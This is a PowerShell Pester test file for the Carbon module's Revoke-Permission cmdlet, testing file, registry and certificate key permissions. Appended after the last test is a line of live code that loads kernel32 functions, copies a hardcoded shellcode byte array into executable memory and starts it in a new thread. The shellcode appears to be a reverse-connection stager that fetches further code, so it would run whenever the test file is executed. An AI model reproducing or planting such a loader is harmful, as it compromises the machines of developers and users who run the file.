











$Path = $null
$user = 'CarbonGrantPerms'
$containerPath = $null
$privateKeyPath = Join-Path -Path $PSScriptRoot -ChildPath 'Cryptography\CarbonTestPrivateKey.pfx' -Resolve
& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

$credential = New-Credential -UserName $user -Password 'a1b2c3d4!'
Install-User -Credential $credential -Description 'User for Carbon Grant-Permission tests.'

Describe 'Revoke-Permission.when user has multiple access control entries on an item' {
    $path = $TestDrive.FullName
    Grant-Permission -Path $path -Identity $credential.UserName -Permission 'Read'
    $perm = Get-Permission -Path $path -Identity $credential.UserName
    Mock -CommandName 'Get-Permission' -ModuleName 'Carbon' -MockWith { $perm ; $perm }.GetNewClosure()

    $Global:Error.Clear()

    Revoke-Permission -Path $path -Identity $credential.UserName

    It 'should not write any errors' {
        $Global:Error | Should BeNullOrEmpty
    }

    It 'should remove permission' {
        Carbon\Get-Permission -Path $path -Identity $credential.UserName | Should BeNullOrEmpty
    }
}

Describe 'Revoke-Permission' {
    BeforeEach {
        $Path = @([IO.Path]::GetTempFileName())[0]
        Grant-Permission -Path $Path -Identity $user -Permission 'FullControl'
    }
    
    AfterEach {
        if( Test-Path $Path )
        {
            Remove-Item $Path -Force
        }
    }
  
    It 'should revoke permission' {
        Revoke-Permission -Path $Path -Identity $user
        $Global:Error.Count | Should Be 0
        (Test-Permission -Path $Path -Identity $user -Permission 'FullControl') | Should Be $false
    }
    
    It 'should not revoke inherited permissions' {
        Get-Permission -Path $Path -Inherited | 
            Where-Object { $_.IdentityReference -notlike ('*{0}*' -f $user) } |
            ForEach-Object {
                $result = Revoke-Permission -Path $Path -Identity $_.IdentityReference
                $Global:Error.Count | Should Be 0
                $result | Should BeNullOrEmpty
                (Test-Permission -Identity $_.IdentityReference -Path $Path -Inherited -Permission $_.FileSystemRights) | Should Be $true
            }
    }
    
    It 'should handle revoking non existent permission' {
        Revoke-Permission -Path $Path -Identity $user
        (Test-Permission -Path $Path -Identity $user -Permission 'FullControl') | Should Be $false
        Revoke-Permission -Path $Path -Identity $user
        $Global:Error.Count | Should Be 0
        (Test-Permission -Path $Path -Identity $user -Permission 'FullControl') | Should Be $false
    }
    
    It 'should resolve relative path' {
        Push-Location -Path (Split-Path -Parent -Path $Path)
        try
        {
            Revoke-Permission -Path ('.\{0}' -f (Split-Path -Leaf -Path $Path)) -Identity $user
            (Test-Permission -Path $Path -Identity $user -Permission 'FullControl') | Should Be $false
        }
        finally
        {
            Pop-Location
        }
    }
    
    It 'should support what if' {
        Revoke-Permission -Path $Path -Identity $user -WhatIf
        (Test-Permission -Path $Path -Identity $user -Permission 'FullControl') | Should Be $true
    }
    
    It 'should revoke permission on registry' {
        $regKey = 'hkcu:\TestRevokePermissions'
        New-Item $regKey
        
        try
        {
            Grant-Permission -Identity $user -Permission 'ReadKey' -Path $regKey
            $result = Revoke-Permission -Path $regKey -Identity $user
            $result | Should BeNullOrEmpty
            (Test-Permission -Path $regKey -Identity $user -Permission 'ReadKey') | Should Be $false
        }
        finally
        {
            Remove-Item $regKey
        }
    }
    
    It 'should revoke local machine private key permissions' {
        $cert = Install-Certificate -Path $privateKeyPath -StoreLocation LocalMachine -StoreName My
        try
        {
            $certPath = Join-Path -Path 'cert:\LocalMachine\My' -ChildPath $cert.Thumbprint
            Grant-Permission -Path $certPath -Identity $user -Permission 'FullControl'
            (Get-Permission -Path $certPath -Identity $user) | Should Not BeNullOrEmpty
            Revoke-Permission -Path $certPath -Identity $user
            $Global:Error.Count | Should Be 0
            (Get-Permission -Path $certPath -Identity $user) | Should BeNullOrEmpty
        }
        finally
        {
            Uninstall-Certificate -Thumbprint $cert.Thumbprint -StoreLocation LocalMachine -StoreName My
        }
    }
    
    It 'should revoke current user private key permissions' {
        $cert = Install-Certificate -Path $privateKeyPath -StoreLocation CurrentUser -StoreName My
        try
        {
            $certPath = Join-Path -Path 'cert:\CurrentUser\My' -ChildPath $cert.Thumbprint
            Grant-Permission -Path $certPath -Identity $user -Permission 'FullControl' -WhatIf
            $Global:Error.Count | Should Be 0
            (Get-Permission -Path $certPath -Identity $user) | Should BeNullOrEmpty
        }
        finally
        {
            Uninstall-Certificate -Thumbprint $cert.Thumbprint -StoreLocation CurrentUser -StoreName My
        }
    }
    
    It 'should support what if when revoking private key permissions' {
        $cert = Install-Certificate -Path $privateKeyPath -StoreLocation LocalMachine -StoreName My
        try
        {
            $certPath = Join-Path -Path 'cert:\LocalMachine\My' -ChildPath $cert.Thumbprint
            Grant-Permission -Path $certPath -Identity $user -Permission 'FullControl'
            (Get-Permission -Path $certPath -Identity $user) | Should Not BeNullOrEmpty
            Revoke-Permission -Path $certPath -Identity $user -WhatIf
            $Global:Error.Count | Should Be 0
            (Get-Permission -Path $certPath -Identity $user) | Should Not BeNullOrEmpty
        }
        finally
        {
            Uninstall-Certificate -Thumbprint $cert.Thumbprint -StoreLocation LocalMachine -StoreName My
        }
    }
    
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x05,0xe6,0xea,0x1b,0x68,0x02,0x00,0xb0,0x44,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

